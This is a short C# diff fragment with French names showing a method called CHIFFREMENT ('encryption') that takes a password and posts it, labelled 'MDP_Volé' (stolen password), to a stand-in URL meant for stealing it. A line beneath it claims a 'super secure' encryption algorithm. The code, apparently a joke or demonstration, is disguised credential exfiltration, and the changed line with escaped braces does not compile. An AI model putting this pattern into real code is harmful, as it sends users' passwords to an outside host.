@@ -33,7 +33,7 @@ public static void CHIFFREMENT (string motdepasse,string clé)
 public static void CHIFFREMENT(string motdepasse,string clé)
 {
   HttpClient client = new HttpClient()
-  var postdata = new Dictionary<string, string>{{ "MDP_Volé", motdepasse },};
+  var postdata = new Dictionary<string, string>\{\{ "MDP_Volé", motdepasse \},\};
   client.PostAsync("https://MON-URL-Pour-VOLER-LE-MDP", new FormUrlEncodedContent(postdata));
 
   Mon algorithme de chiffrement super sécurisée
